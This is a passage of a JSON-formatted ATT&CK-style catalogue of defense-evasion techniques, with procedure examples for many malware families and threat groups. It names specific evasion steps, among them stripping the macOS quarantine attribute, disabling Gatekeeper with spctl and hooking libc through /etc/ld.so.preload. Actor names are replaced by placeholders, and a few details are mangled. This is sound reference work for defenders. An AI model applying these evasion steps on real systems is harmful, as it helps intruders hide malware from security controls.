                "Description": "malware is obfuscated using the open source ConfuserEx protector. malware also obfuscates the name of created files/folders/mutexes and encrypts debug messages written to log files using the Rijndael cipher.[97]"
            },
            "G0004": {
                "ID": "G0004",
                "Name": "Ke3chang",
                "Description": "malware has used Base64-encoded shellcode strings.[98]"
            },
            "S0585": {
                "ID": "S0585",
                "Name": "Kerrdown",
                "Description": "malware can encrypt, encode, and compress multiple layers of shellcode.[99]"
            },
            "S0607": {
                "ID": "S0607",
                "Name": "KillDisk",
                "Description": "malware uses VMProtect to make reverse engineering the malware more difficult.[100]"
            },
            "G0094": {
                "ID": "G0094",
                "Name": "Kimsuky",
                "Description": "malware has obfuscated binary strings including the use of XOR encryption and Base64 encoding.[101][102] malware has also modified the first byte of DLL implants targeting victims to prevent recognition of the executable file format.[103]"
            },
            "S0641": {
                "ID": "S0641",
                "Name": "Kobalos",
                "Description": "malware encrypts all strings using RC4 and bundles all functionality into a single function call.[104]"
            },
            "S0447": {
                "ID": "S0447",
                "Name": "Lokibot",
                "Description": "malware has obfuscated strings with base64 encoding.[105]"
            },
            "S0167": {
                "ID": "S0167",
                "Name": "Matryoshka",
                "Description": "malware obfuscates API function names using a substitute cipher combined with Base64 encoding.[106]"
            },
            "S0449": {
                "ID": "S0449",
                "Name": "Maze",
                "Description": "malware has decrypted strings and other important information during the encryption process. malware also calls certain functions dynamically to hinder analysis.[107]"
            },
            "S0500": {
                "ID": "S0500",
                "Name": "MCMD",
                "Description": "malware can Base64 encode output strings prior to sending to C2.[108]"
            },
            "S0051": {
                "ID": "S0051",
                "Name": "MiniDuke",
                "Description": "malware can use control flow flattening to obscure code.[73]"
            },
            "G0129": {
                "ID": "G0129",
                "Name": "Mustang Panda",
                "Description": "malware has delivered initial payloads hidden using archives and encoding measures.[109][110][111][112][113][114]"
            },
            "S0336": {
                "ID": "S0336",
                "Name": "NanoCore",
                "Description": "malware\u2019s plugins were obfuscated with Eazfuscater.NET 3.3.[115]"
            },
            "S0198": {
                "ID": "S0198",
                "Name": "NETWIRE",
                "Description": "malware has used a custom obfuscation algorithm to hide strings including Registry keys, APIs, and DLL names.[116]"
            },
            "S1090": {
                "ID": "S1090",
                "Name": "NightClub",
                "Description": "malware can obfuscate strings using the congruential generator (LCG): staten+1 = (690069 \u00d7 staten + 1) mod 232.[117]"
            },
            "S0353": {
                "ID": "S0353",
                "Name": "NOKKI",
                "Description": "malware uses Base64 encoding for strings.[118]"
            },
            "S0138": {
                "ID": "S0138",
                "Name": "OLDBAIT",
                "Description": "malware obfuscates internal strings and unpacks them at startup.[54]"
            },
            "S0264": {
                "ID": "S0264",
                "Name": "OopsIE",
                "Description": "malware uses the Confuser protector to obfuscate an embedded .Net Framework assembly used for C2. malware also encodes collected data in hexadecimal format before writing to files on disk and obfuscates strings.[119][120]"
            },
            "S0229": {
                "ID": "S0229",
                "Name": "Orz",
                "Description": "Some malware strings are base64 encoded, such as the embedded DLL known as MockDll.[121]"
            },
            "S0594": {
                "ID": "S0594",
                "Name": "Out1",
                "Description": "malware has the ability to encode data.[122]"
            },
            "S0598": {
                "ID": "S0598",
                "Name": "P.A.S. Webshell",
                "Description": "malware can use encryption and base64 encoding to hide strings and to enforce access control once deployed.[123]"
            },
            "S0664": {
                "ID": "S0664",
                "Name": "Pandora",
                "Description": "malware has the ability to compress stings with QuickLZ.[124]"
            },
            "S0517": {
                "ID": "S0517",
                "Name": "Pillowmint",
                "Description": "malware has been compressed and stored within a registry key. malware has also obfuscated the AES key used for encryption.[125]"
            },
            "S0124": {
                "ID": "S0124",
                "Name": "Pisloader",
                "Description": "malware obfuscates files by splitting strings into smaller sub-strings and including \"garbage\" strings that are never used. The malware also uses return-oriented programming (ROP) technique and single-byte XOR to obfuscate data.[126]"
            },
            "S0013": {
                "ID": "S0013",
                "Name": "PlugX",
                "Description": "malware can use API hashing and modify the names of strings to evade detection.[42][114]"
            },
            "S0428": {
                "ID": "S0428",
                "Name": "PoetRAT",
                "Description": "malware has used a custom encryption scheme for communication between scripts.[127]"
            },
            "S0012": {
                "ID": "S0012",
                "Name": "PoisonIvy",
                "Description": "malware hides any strings related to its own indicators of compromise.[128]"
            },
            "S0518": {
                "ID": "S0518",
                "Name": "PolyglotDuke",
                "Description": "malware can custom encrypt strings.[73]"
            },
            "S0453": {
                "ID": "S0453",
                "Name": "Pony",
                "Description": "malware attachments have been delivered via compressed archive files. malware also obfuscates the memory flow by adding junk instructions when executing to make analysis more difficult.[129]"
            },
            "S0150": {
                "ID": "S0150",
                "Name": "POSHSPY",
                "Description": "malware appends a file signature header (randomly selected from six file types) to encrypted data prior to upload or download.[130]"
            },
            "S0393": {
                "ID": "S0393",
                "Name": "PowerStallion",
                "Description": "malware uses a XOR cipher to encrypt command output written to its OneDrive C2 server.[131]"
            },
            "S0196": {
                "ID": "S0196",
                "Name": "PUNCHBUGGY",
                "Description": "malware has hashed most its code's functions and encrypted payloads with base64 and XOR.[132]"
            },
            "S0197": {
                "ID": "S0197",
                "Name": "PUNCHTRACK",
                "Description": "malware is loaded and executed by a highly obfuscated launcher.[133]"
            },
            "S0650": {
                "ID": "S0650",
                "Name": "QakBot",
                "Description": "malware has hidden code within Excel spreadsheets by turning the font color to white and splitting it across multiple cells.[134]"
            },
            "S0458": {
                "ID": "S0458",
                "Name": "Ramsay",
                "Description": "malware has base64-encoded its portable executable and hidden itself under a JPG header. malware can also embed information within document footers.[135]"
            },
            "S0511": {
                "ID": "S0511",
                "Name": "RegDuke",
                "Description": "malware can use control-flow flattening or the commercially available .NET Reactor for obfuscation.[73]"
            },
            "S0332": {
                "ID": "S0332",
                "Name": "Remcos",
                "Description": "malware uses RC4 and base64 to obfuscate data, including Registry entries and file paths.[136]"
            },
            "G0106": {
                "ID": "G0106",
                "Name": "Rocke",
                "Description": "malware has modified UPX headers after packing files to break unpackers.[137]"
            },
            "S0240": {
                "ID": "S0240",
                "Name": "ROKRAT",
                "Description": "malware can encrypt data prior to exfiltration by using an RSA public key.[21][138]"
            },
            "S0148": {
                "ID": "S0148",
                "Name": "RTM",
                "Description": "malware strings, network data, configuration, and modules are encrypted with a modified RC4 algorithm. malware has also been delivered to targets as various archive files including ZIP, 7-ZIP, and RAR.[139][140]"
            },
            "S0446": {
                "ID": "S0446",
                "Name": "Ryuk",
                "Description": "malware can use anti-disassembly and code transformation obfuscation techniques.[53]"
            },
            "S1018": {
                "ID": "S1018",
                "Name": "Saint Bot",
                "Description": "malware has been obfuscated to help avoid detection.[71]"
            },
            "S1099": {
                "ID": "S1099",
                "Name": "Samurai",
                "Description": "malware can encrypt the names of requested APIs and deliver its final payload as a compressed, encrypted and base64 encoded blob.[141]"
            },
            "G0034": {
                "ID": "G0034",
                "Name": "Sandworm Team",
                "Description": "malware has used Base64 encoding within malware variants.[142]"
            },
            "S1085": {
                "ID": "S1085",
                "Name": "Sardonic",
                "Description": "malware can use certain ConfuserEx features for obfuscation and can be encoded in a base64 string.[143]"
            },
            "S0461": {
                "ID": "S0461",
                "Name": "SDBbot",
                "Description": "malware has the ability to XOR the strings for its installer component with a hardcoded 128 byte key.[144]"
            },
            "S0596": {
                "ID": "S0596",
                "Name": "ShadowPad",
                "Description": "malware has encrypted its payload, a virtual file system, and various files.[145][66]"
            },
            "S0140": {
                "ID": "S0140",
                "Name": "Shamoon",
                "Description": "malware contains base64-encoded strings.[146]"
            },
            "S0444": {
                "ID": "S0444",
                "Name": "ShimRat",
                "Description": "malware has been delivered as a package that includes compressed DLL and shellcode payloads within a .dat file.[147]"
            },
            "S0445": {
                "ID": "S0445",
                "Name": "ShimRatReporter",
                "Description": "malware encrypted gathered information with a combination of shifting and XOR using a static key.[147]"
            },
            "S0063": {
                "ID": "S0063",
                "Name": "SHOTPUT",
                "Description": "malware is obscured using XOR encoding and appended to a valid GIF file.[148][149]"
            },
            "S0623": {
                "ID": "S0623",
                "Name": "Siloscape",
                "Description": "malware itself is obfuscated and uses obfuscated API calls.[150]"
            },
            "S1104": {
                "ID": "S1104",
                "Name": "SLOWPULSE",
                "Description": "malware can hide malicious code in the padding regions between legitimate functions in the Pulse Secure libdsplibs.so file.[151]"
            },
            "S1035": {
                "ID": "S1035",
                "Name": "Small Sieve",
                "Description": "malware has the ability to use a custom hex byte swapping encoding scheme combined with an obfuscated Base64 function to protect program strings and Telegram credentials.[152]"
            },
            "S1086": {
                "ID": "S1086",
                "Name": "Snip3",
                "Description": "malware has the ability to obfuscate strings using XOR encryption.[153]"
            },
            "S0627": {
                "ID": "S0627",
                "Name": "SodaMaster",
                "Description": "malware can use \"stackstrings\" for obfuscation.[69]"
            },
            "S0615": {
                "ID": "S0615",
                "Name": "SombRAT",
                "Description": "malware can encrypt strings with XOR-based routines and use a custom AES storage format for plugins, configuration, C2 domains, and harvested data.[154][155][156]"
            },
            "S0516": {
                "ID": "S0516",
                "Name": "SoreFang",
                "Description": "malware has the ability to encode and RC6 encrypt data sent to C2.[157]"
            },
            "S0142": {
                "ID": "S0142",
                "Name": "StreamEx",
                "Description": "malware obfuscates some commands by using statically programmed fragments of strings when starting a DLL. It also uses a one-byte xor against 0x91 to encode configuration data.[158]"
            },
            "S0559": {
                "ID": "S0559",
                "Name": "SUNBURST",
                "Description": "malware strings were compressed and encoded in Base64.[159] malware also obfuscated collected system information using a FNV-1a + XOR algorithm.[160]"
            },
            "S0562": {
                "ID": "S0562",
                "Name": "SUNSPOT",
                "Description": "malware encrypted log entries it collected with the stream cipher RC4 using a hard-coded key. It also uses AES128-CBC encrypted blobs for SUNBURST source code and data extracted from the SolarWinds Orion <MsBuild.exe process.[161]"
            },
            "S1064": {
                "ID": "S1064",
                "Name": "SVCReady",
                "Description": "malware can encrypt victim data with an RC4 cipher.[162]"
            },
            "S0242": {
                "ID": "S0242",
                "Name": "SynAck",
                "Description": "malware payloads are obfuscated prior to compilation to inhibit analysis and/or reverse engineering.[163][164]"
            },
            "S0467": {
                "ID": "S0467",
                "Name": "TajMahal",
                "Description": "malware has used an encrypted Virtual File System to store plugins.[165]"
            },
            "S0560": {
                "ID": "S0560",
                "Name": "TEARDROP",
                "Description": "malware created and read from a file with a fake JPG header, and its payload was encrypted with a simple rotating XOR cipher.[160][166][167]"
            },
            "S0266": {
                "ID": "S0266",
                "Name": "TrickBot",
                "Description": "malware uses non-descriptive names to hide functionality.[168]"
            },
            "S0094": {
                "ID": "S0094",
                "Name": "Trojan.Karagany",
                "Description": "malware can base64 encode and AES-128-CBC encrypt data prior to transmission.[169]"
            },
            "S0647": {
                "ID": "S0647",
                "Name": "Turian",
                "Description": "malware can use VMProtect for obfuscation.[25]"
            },
            "S0476": {
                "ID": "S0476",
                "Name": "Valak",
                "Description": "malware has the ability to base64 encode and XOR encrypt strings.[170][171][172]"
            },
            "G0112": {
                "ID": "G0112",
                "Name": "Windshift",
                "Description": "malware has used string encoding with floating point calculations.[173]"
            },
            "S0117": {
                "ID": "S0117",
                "Name": "XTunnel",
                "Description": "A version of malware introduced in July 2015 obfuscated the binary using opaque predicates and other techniques in a likely attempt to obfuscate it and bypass security products.[174]"
            }
        }
    },
    "T1647": {
        "ttp_name": "Plist File Modification",
        "ttp_id": "T1647",
        "href": "/techniques/T1647",
        "tactic": "Defense Evasion",
        "description": "Adversaries may modify property list files (plist files) to enable other malicious activity, while also potentially evading and bypassing system defenses. macOS applications use plist files, such as the info.plist file, to store properties and configuration settings that inform the operating system how to handle the application at runtime. Plist files are structured metadata in key-value pairs formatted in XML based on Apple's Core Foundation DTD. Plist files can be saved in text or binary format.[1] Adversaries can modify key-value pairs in plist files to influence system behaviors, such as hiding the execution of an application (i.e. Hidden Window) or running additional commands for persistence (ex: Launch Agent/Launch Daemon or Re-opened Applications).For example, adversaries can add a malicious application path to the ~/Library/Preferences/com.apple.dock.plist file, which controls apps that appear in the Dock. Adversaries can also modify the LSUIElement key in an application\u2019s info.plist file  to run the app in the background. Adversaries can also insert key-value pairs to insert environment variables, such as LSEnvironment, to enable persistence via Dynamic Linker Hijacking.[2][3]",
        "Procedure": {
            "S0658": {
                "ID": "S0658",
                "Name": "XCSSET",
                "Description": "malware uses the plutil command to modify the LSUIElement, DFBundleDisplayName, and CFBundleIdentifier keys in the /Contents/Info.plist file to change how malware is visible on the system.[4]"
            }
        }
    },
    "T1620": {
        "ttp_name": "Reflective Code Loading",
        "ttp_id": "T1620",
        "href": "/techniques/T1620",
        "tactic": "Defense Evasion",
        "description": "Adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads. Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk (e.g., Shared Modules).Reflectively loaded payloads may be compiled binaries, anonymous files (only present in RAM), or just snubs of fileless executable code (ex: position-independent shellcode).[1][2][3][4][5] For example, the Assembly.Load() method executed by PowerShell may be abused to load raw code into the running process.[6]Reflective code injection is very similar to Process Injection except that the \"injection\" loads code into the processes\u2019 own memory instead of that of a separate process. Reflective loading may evade process-based detections since the execution of the arbitrary code may be masked within a legitimate or otherwise benign process. Reflectively loading payloads directly into memory may also avoid creating files or other artifacts on disk, while also enabling malware to keep these payloads encrypted (or otherwise obfuscated) until execution.[3][4][7][8]",
        "Procedure": {
            "S1081": {
                "ID": "S1081",
                "Name": "BADHATCH",
                "Description": "malware can copy a large byte array of 64-bit shellcode into process memory and execute it with a call to CreateThread.[9]"
            },
            "S1063": {
                "ID": "S1063",
                "Name": "Brute Ratel C4",
                "Description": "malware has used reflective loading to execute malicious DLLs.[10]"
            },
            "S0154": {
                "ID": "S0154",
                "Name": "Cobalt Strike",
                "Description": "malware's execute-assembly command can run a .NET executable within the memory of a sacrificial process by loading the CLR.[11]"
            },
            "S0625": {
                "ID": "S0625",
                "Name": "Cuba",
                "Description": "malware loaded the payload into memory using PowerShell.[12]"
            },
            "S0695": {
                "ID": "S0695",
                "Name": "Donut",
                "Description": "malware can generate code modules that enable in-memory execution of VBScript, JScript, EXE, DLL, and dotNET payloads.[13]"
            },
            "S0367": {
                "ID": "S0367",
                "Name": "Emotet",
                "Description": "malware has reflectively loaded payloads into memory.[14]"
            },
            "S0661": {
                "ID": "S0661",
                "Name": "FoggyWeb",
                "Description": "malware's loader has reflectively loaded .NET-based assembly/payloads into memory.[15]"
            },
            "S0666": {
                "ID": "S0666",
                "Name": "Gelsemium",
                "Description": "malware can use custom shellcode to map embedded DLLs into memory.[16]"
            },
            "S1022": {
                "ID": "S1022",
                "Name": "IceApple",
                "Description": "malware can use reflective code loading to load .NET assemblies into MSExchangeOWAAppPool on targeted Exchange servers.[17]"
            },
            "G0032": {
                "ID": "G0032",
                "Name": "Lazarus Group",
                "Description": "malware has changed memory protection permissions then overwritten in memory DLL function code with shellcode, which was later executed via KernelCallbackTable hijacking. malware has also used shellcode within macros to decrypt and manually map DLLs into memory at runtime.[18][19]"
            },
            "S0447": {
                "ID": "S0447",
                "Name": "Lokibot",
                "Description": "malware has reflectively loaded the decoded DLL into memory.[20]"
            },
            "S1059": {
                "ID": "S1059",
                "Name": "metaMain",
                "Description": "malware has reflectively loaded a DLL to read, decrypt, and load an orchestrator file.[21]"
            },
            "S0194": {
                "ID": "S0194",
                "Name": "PowerSploit",
                "Description": "malware reflectively loads a Windows PE file into a process.[22][23]"
            },
            "S1085": {
                "ID": "S1085",
                "Name": "Sardonic",
                "Description": "malware has a plugin system that can load specially made DLLs into memory and execute their functions.[24][25]"
            },
            "S0595": {
                "ID": "S0595",
                "Name": "ThiefQuest",
                "Description": "malware uses various API functions such as NSCreateObjectFileImageFromMemory to load and link in-memory payloads.[26]"
            },
            "S0022": {
                "ID": "S0022",
                "Name": "Uroburos",
                "Description": "malware has the ability to load new modules directly into memory using its Load Modules Mem command.[27]"
            },
            "S0689": {
                "ID": "S0689",
                "Name": "WhisperGate",
                "Description": "malware's downloader can reverse its third stage file bytes and reflectively load the file as a .NET assembly.[28]"
            }
        }
    },
    "T1207": {
        "ttp_name": "Rogue Domain Controller",
        "ttp_id": "T1207",
        "href": "/techniques/T1207",
        "tactic": "Defense Evasion",
        "description": "Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data. DCShadow may be used to create a rogue Domain Controller (DC). DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a DC. [1] Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys.Registering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash. [2]This technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors). [1] The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis. Adversaries may also utilize this technique to perform SID-History Injection and/or manipulate AD objects (such as accounts, access control lists, schemas) to establish backdoors for Persistence. [1]",
        "Procedure": {
            "S0002": {
                "ID": "S0002",
                "Name": "Mimikatz",
                "Description": "malware\u2019s LSADUMP::DCShadow module can be used to make AD updates by temporarily setting a computer to be a DC.[3][2]"
            }
        }
    },
    "T1014": {
        "ttp_name": "Rootkit",
        "ttp_id": "T1014",
        "href": "/techniques/T1014",
        "tactic": "Defense Evasion",
        "description": "Adversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting/hooking and modifying operating system API calls that supply system information. [1] Rootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a hypervisor, Master Boot Record, or System Firmware. [2] Rootkits have been seen for Windows, Linux, and Mac OS X systems. [3] [4]",
        "Procedure": {
            "G0007": {
                "ID": "G0007",
                "Name": "APT28",
                "Description": "malware has used a UEFI (Unified Extensible Firmware Interface) rootkit known as LoJax.[5][6]"
            },
            "G0096": {
                "ID": "G0096",
                "Name": "APT41",
                "Description": "malware deployed rootkits on Linux systems.[7][8]"
            },
            "S0484": {
                "ID": "S0484",
                "Name": "Carberp",
                "Description": "malware has used user mode rootkit techniques to remain hidden on the system.[9]"
            },
            "S0572": {
                "ID": "S0572",
                "Name": "Caterpillar WebShell",
                "Description": "malware has a module to use a rootkit on a system.[10]"
            },
            "S1105": {
                "ID": "S1105",
                "Name": "COATHANGER",
                "Description": "malware hooks or replaces multiple legitimate processes and other functions on victim devices.[11]"
            },
            "S0502": {
                "ID": "S0502",
                "Name": "Drovorub",
                "Description": "malware has used a kernel module rootkit to hide processes, files, executables, and network artifacts from user space view.[12]"
            },
            "S0377": {
                "ID": "S0377",
                "Name": "Ebury",
                "Description": "malware has used user mode rootkit techniques to remain hidden on the system.[13]"
            },
            "S0047": {
                "ID": "S0047",
                "Name": "Hacking Team UEFI Rootkit",
                "Description": "malware is a UEFI BIOS rootkit developed by the company Hacking Team to persist remote access software on some targeted systems.[14]"
            },
            "S0394": {
                "ID": "S0394",
                "Name": "HiddenWasp",
                "Description": "malware uses a rootkit to hook and implement functions on the system.[15]"
            },
            "S0135": {
                "ID": "S0135",
                "Name": "HIDEDRV",
                "Description": "malware is a rootkit that hides certain operating system artifacts.[16]"
            },
            "S0009": {
                "ID": "S0009",
                "Name": "Hikit",
                "Description": "malware is a Rootkit that has been used by Axiom.[17] [18]"
            },
            "S0601": {
                "ID": "S0601",
                "Name": "Hildegard",
                "Description": "malware has modified /etc/ld.so.preload to overwrite readdir() and readdir64().[19]"
            },
            "S0040": {
                "ID": "S0040",
                "Name": "HTRAN",
                "Description": "malware can install a rootkit to hide network connections from the host OS.[20]"
            },
            "S0397": {
                "ID": "S0397",
                "Name": "LoJax",
                "Description": "malware is a UEFI BIOS rootkit deployed to persist remote access software on some targeted systems.[6]"
            },
            "S0012": {
                "ID": "S0012",
                "Name": "PoisonIvy",
                "Description": "malware starts a rootkit from a malicious file dropped to disk.[21]"
            },
            "S0458": {
                "ID": "S0458",
                "Name": "Ramsay",
                "Description": "malware has included a rootkit to evade defenses.[22]"
            },
            "G0106": {
                "ID": "G0106",
                "Name": "Rocke",
                "Description": "malware has modified /etc/ld.so.preload to hook libc functions in order to hide the installed dropper and mining software in process lists.[23]"
            },
            "S0468": {
                "ID": "S0468",
                "Name": "Skidmap",
                "Description": "malware is a kernel-mode rootkit that has the ability to hook system calls to hide specific files and fake network and CPU-related statistics to make the CPU load of the infected machine always appear low.[24]"
            },
            "S0603": {
                "ID": "S0603",
                "Name": "Stuxnet",
                "Description": "malware uses a Windows rootkit to mask its binaries and other relevant files.[25]"
            },
            "G0139": {
                "ID": "G0139",
                "Name": "TeamTNT",
                "Description": "malware has used rootkits such as the open-source Diamorphine rootkit and their custom bots to hide cryptocurrency mining activities on the machine.[26] [27]"
            },
            "S0221": {
                "ID": "S0221",
                "Name": "Umbreon",
                "Description": "malware hides from defenders by hooking libc function calls, hiding artifacts that would reveal its presence, such as the user account it creates to provide access and undermining strace, a tool often used to identify malware.[28]"
            },
            "S0022": {
                "ID": "S0022",
                "Name": "Uroburos",
                "Description": "malware can use its kernel module to prevent its host components from being listed by the targeted system's OS and to mediate requests between user mode and concealed components.[29][30]"
            },
            "S0670": {
                "ID": "S0670",
                "Name": "WarzoneRAT",
                "Description": "malware can include a rootkit to hide processes, files, and startup.[31]"
            },
            "S0430": {
                "ID": "S0430",
                "Name": "Winnti for Linux",
                "Description": "malware has used a modified copy of the open-source userland rootkit Azazel, named libxselinux.so, to hide the malware's operations and network activity.[32]"
            },
            "G0044": {
                "ID": "G0044",
                "Name": "Winnti Group",
                "Description": "malware used a rootkit to modify typical server functionality.[33]"
            },
            "S0027": {
                "ID": "S0027",
                "Name": "Zeroaccess",
                "Description": "malware is a kernel-mode rootkit.[34]"
            }
        }
    },
    "T1553": {
        "ttp_name": "Subvert Trust Controls",
        "ttp_id": "T1553",
        "href": "/techniques/T1553",
        "subtechnique": {
            "001": {
                "name": "Gatekeeper Bypass",
                "href": "/techniques/T1553/001",
                "description": "Adversaries may modify file attributes and subvert Gatekeeper functionality to evade user prompts and execute untrusted programs. Gatekeeper is a set of technologies that act as layer of Apple\u2019s security model to ensure only trusted applications are executed on a host. Gatekeeper was built on top of File Quarantine in Snow Leopard (10.6, 2009) and has grown to include Code Signing, security policy compliance, Notarization, and more. Gatekeeper also treats applications running for the first time differently than reopened applications.[1][2]Based on an opt-in system, when files are downloaded an extended attribute (xattr) called com.apple.quarantine (also known as a quarantine flag) can be set on the file by the application performing the download. Launch Services opens the application in a suspended state. For first run applications with the quarantine flag set, Gatekeeper executes the following functions:Checks extended attribute \u2013 Gatekeeper checks for the quarantine flag, then provides an alert prompt to the user to allow or deny execution.[3][4]Checks System Policies - Gatekeeper checks the system security policy, allowing execution of apps downloaded from either just the App Store or the App Store and identified developers.Code Signing \u2013 Gatekeeper checks for a valid code signature from an Apple Developer ID.Notarization - Using the api.apple-cloudkit.com API, Gatekeeper reaches out to Apple servers to verify or pull down the notarization ticket and ensure the ticket is not revoked. Users can override notarization, which will result in a prompt of executing an \"unauthorized app\" and the security policy will be modified.Adversaries can subvert one or multiple security controls within Gatekeeper checks through logic errors (e.g. Exploitation for Defense Evasion), unchecked file types, and external libraries. For example, prior to macOS 13 Ventura, code signing and notarization checks were only conducted on first launch, allowing adversaries to write malicious executables to previously opened applications in order to bypass Gatekeeper security checks.[5][6]Applications and files loaded onto the system from a USB flash drive, optical disk, external hard drive, from a drive shared over the local network, or using the curl command may not set the quarantine flag. Additionally, it is possible to avoid setting the quarantine flag using Drive-by Compromise.",
                "Procedure": {
                    "S0369": {
                        "ID": "S0369",
                        "Name": "CoinTicker",
                        "Description": "<name> downloads the EggShell mach-o binary using curl, which does not set the quarantine flag.[7]"
                    },
                    "S1016": {
                        "ID": "S1016",
                        "Name": "MacMa",
                        "Description": "<name> has removed the com.apple.quarantineattribute from the dropped file, $TMPDIR/airportpaird.[8]"
                    },
                    "S0402": {
                        "ID": "S0402",
                        "Name": "OSX/Shlayer",
                        "Description": "If running with elevated privileges, <name> has used the spctl command to disable Gatekeeper protection for a downloaded file. <name> can also leverage system links pointing to bash scripts in the downloaded DMG file to bypass Gatekeeper, a flaw patched in macOS 11.3 and later versions. <name> has been Notarized by Apple, resulting in successful passing of additional Gatekeeper checks.[9][10][11]"
                    },
                    "S0352": {
                        "ID": "S0352",
                        "Name": "OSX_OCEANLOTUS.D",
                        "Description": "<name> uses the command xattr -d com.apple.quarantine to remove the quarantine file attribute used by Gatekeeper.[12][4]"
                    },
                    "S0658": {
                        "ID": "S0658",
                        "Name": "XCSSET",
                        "Description": "<name> has dropped a malicious applet into an app's .../Contents/MacOS/ folder of a previously launched app to bypass Gatekeeper's security checks on first launch apps (prior to macOS 13).[6]"
                    }
                }
            },
            "002": {
                "name": "Code Signing",
                "href": "/techniques/T1553/002",
                "description": "Adversaries may create, acquire, or steal code signing materials to sign their malware or tools. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. [1] The certificates used during an operation may be created, acquired, or stolen by the adversary. [2] [3] Unlike Invalid Code Signature, this activity will result in a valid signature.Code signing to verify software on first run can be used on modern Windows and macOS systems. It is not used on Linux due to the decentralized nature of the platform. [1][4]Code signing certificates may be used to bypass security policies that require signed code to execute on a system.",
                "Procedure": {
                    "S0504": {
                        "ID": "S0504",
                        "Name": "Anchor",
                        "Description": "<name> has been signed with valid certificates to evade detection by security tools.[5]"
                    },
                    "S0584": {
                        "ID": "S0584",
                        "Name": "AppleJeus",
                        "Description": "<name> has used a valid digital signature from Sectigo to appear legitimate.[6]"
                    },
                    "G0096": {
                        "ID": "G0096",
                        "Name": "APT41",
                        "Description": "<name> leveraged code-signing certificates to sign malware when targeting both gaming and non-gaming organizations.[7][8]"
                    },
                    "S0475": {
                        "ID": "S0475",
                        "Name": "BackConfig",
                        "Description": "<name> has been signed with self signed digital certificates mimicking a legitimate software company.[9]"
                    },
                    "S0234": {
                        "ID": "S0234",
                        "Name": "Bandook",
                        "Description": "<name> was signed with valid Certum certificates.[10]"
                    },
                    "S0534": {
                        "ID": "S0534",
                        "Name": "Bazar",
                        "Description": "<name> has been signed with fake certificates including those appearing to be from VB CORPORATE PTY. LTD.[11]"
                    },
                    "S1070": {
                        "ID": "S1070",
                        "Name": "Black Basta",
                        "Description": "The <name> dropper has been digitally signed with a certificate issued by Akeo Consulting for legitimate executables used for creating bootable USB drives.[12]"
                    },
                    "S0520": {
                        "ID": "S0520",
                        "Name": "BLINDINGCAN",
                        "Description": "<name> has been signed with code-signing certificates such as CodeRipper.[13]"
                    },
                    "S0415": {
                        "ID": "S0415",
                        "Name": "BOOSTWRITE",
                        "Description": "<name> has been signed by a valid CA.[14]"
                    },
                    "C0015": {
                        "ID": "C0015",
                        "Name": "C0015",
                        "Description": "For <name>, the threat actors used DLL files that had invalid certificates.[15]"
                    },
                    "S0144": {
                        "ID": "S0144",
                        "Name": "ChChes",
                        "Description": "<name> samples were digitally signed with a certificate originally used by Hacking Team that was later leaked and subsequently revoked.[16][17][18]"
                    },
                    "S0611": {
                        "ID": "S0611",
                        "Name": "Clop",
                        "Description": "<name> can use code signing to evade detection.[19]"
                    },
                    "S0154": {
                        "ID": "S0154",
                        "Name": "Cobalt Strike",
                        "Description": "<name> can use self signed Java applets to execute signed applet attacks.[20][21]"
                    },
                    "G0052": {
                        "ID": "G0052",
                        "Name": "CopyKittens",
                        "Description": "<name> digitally signed an executable with a stolen certificate from legitimate company AI Squared.[22]"
                    },
                    "S0527": {
                        "ID": "S0527",
                        "Name": "CSPY Downloader",
                        "Description": "<name> has come signed with revoked certificates.[23]"
                    },
                    "G0012": {
                        "ID": "G0012",
                        "Name": "Darkhotel",
                        "Description": "<name> has used code-signing certificates on its malware that are either forged due to weak keys or stolen. <name> has also stolen certificates and signed backdoors and downloaders with them.[24][25]"
                    },
                    "S0187": {
                        "ID": "S0187",
                        "Name": "Daserf",
                        "Description": "Some <name> samples were signed with a stolen digital certificate.[26]"
                    },
                    "S0377": {
                        "ID": "S0377",
                        "Name": "Ebury",
                        "Description": "<name> has installed a self-signed RPM package mimicking the original system package on RPM based systems.[27]"
                    },
                    "S0624": {
                        "ID": "S0624",
                        "Name": "Ecipekac",
                        "Description": "<name> has used a valid, legitimate digital signature to evade detection.[28]"
                    },
                    "G1003": {
                        "ID": "G1003",
                        "Name": "Ember Bear",
                        "Description": "<name> has used stolen certificates from Electrum Technologies GmbH to sign payloads.[29]"
                    },
                    "S0091": {
                        "ID": "S0091",
                        "Name": "Epic",
                        "Description": "Turla has used valid digital certificates from Sysprint AG to sign its <name> dropper.[30]"
                    },
                    "G0037": {
                        "ID": "G0037",
                        "Name": "FIN6",
                        "Description": "<name> has used Comodo code-signing certificates.[31]"
                    },
                    "G0046": {
                        "ID": "G0046",
                        "Name": "FIN7",
                        "Description": "<name> has signed Carbanak payloads with legally purchased code signing certificates. <name> has also digitally signed their phishing documents, backdoors and other staging tools to bypass security controls.[32][33]"
                    },
                    "G0093": {
                        "ID": "G0093",
                        "Name": "GALLIUM",
                        "Description": "<name> has used stolen certificates to sign its tools including those from Whizzimo LLC.[34]"
                    },
                    "S0168": {
                        "ID": "S0168",
                        "Name": "Gazer",
                        "Description": "<name> versions are signed with various valid certificates; one was likely faked and issued by Comodo for \"Solid Loop Ltd,\" and another was issued for \"Ultimate Computer Support Ltd.\"[35][36]"
                    },
                    "S0342": {
                        "ID": "S0342",
                        "Name": "GreyEnergy",
                        "Description": "<name> digitally signs the malware with a code-signing certificate.[37]"
                    },
                    "S0170": {
                        "ID": "S0170",
                        "Name": "Helminth",
                        "Description": "<name> samples have been signed with legitimate, compromised code signing certificates owned by software company AI Squared.[38]"
                    },
                    "S0697": {
                        "ID": "S0697",
                        "Name": "HermeticWiper",
                        "Description": "The <name> executable has been signed with a legitimate certificate issued to Hermetica Digital Ltd.[39][40][41][42]"
                    },
                    "S0698": {
